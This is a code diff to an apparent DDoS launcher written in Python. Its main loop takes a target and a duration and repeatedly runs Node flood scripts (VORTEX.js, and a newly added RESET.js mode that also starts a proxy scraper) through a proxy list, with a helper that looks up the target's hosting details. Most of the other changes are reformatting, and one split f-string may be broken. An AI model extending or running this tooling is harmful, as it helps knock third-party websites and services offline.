@@ -13,6 +13,7 @@ def pro(cr, tl, br_ln=30):
     br = "█" * fl_ln + "-" * (br_ln - fl_ln)
     return f"[{br}] {cr}/{tl}"
 
+
 def clr_csl():
     o.system("cls" if o.name == "nt" else "clear")
 
@@ -159,7 +160,8 @@ def mn_lp():
                 try:
                     tg = parts[1]
                     mx_tm = int(parts[2])
-                    ani_txt(f"Engaging Attack on {tg} for {mx_tm} seconds... 💥", 0.05)
+                    ani_txt(
+                        f"Engaging Attack on {tg} for {mx_tm} seconds... 💥", 0.05)
                     st_tm = t.time()
                     while t.time() - st_tm < mx_tm:
                         if cmd == "TOR":
@@ -193,6 +195,14 @@ def mn_lp():
                             rn_cmd(
                                 f"node bin/odd/.cache/VORTEX.js {tg} 600 100 10 root/proxy.txt"
                             )
+                        elif cmd == "RESET":
+                            rn_cmd(
+                                f"node bin/odd/.cache/RESET.js {tg} 600 100 10 root/proxy.txt"
+                            )
+                            rn_cmd(f"python3 root/scrape.py &")
+                            rn_cmd(
+                                f"node bin/odd/.cache/RESET.js {tg} 600 100 10 root/proxy.txt"
+                            )
                         t.sleep(1)
                 except IndexError:
                     print("❌ Invalid Command. Usage: <COMMAND> <TARGET> <TIME>")
@@ -204,7 +214,8 @@ def mn_lp():
                 try:
                     tr = parts[1]
                     ld_ani(f"Checking hosting info for {tr}", 1.5)
-                    response = re.get(f"https://check-host.net/ip-info?host={tr}")
+                    response = re.get(
+                        f"https://check-host.net/ip-info?host={tr}")
                     if response.status_code == 200:
                         soup = bs(response.text, "html.parser")
                         details = {
@@ -229,7 +240,8 @@ def mn_lp():
                             print(f"{k}: {v}")
                     else:
                         print(
-                            f"❌ Failed to fetch hosting information. HTTP Status: {response.status_code}"
+                            f"❌ Failed to fetch hosting information. HTTP Status: {
+                                response.status_code}"
                         )
                 except IndexError:
                     print("❌ Invalid Command. Usage: HOST <DOMAIN>")
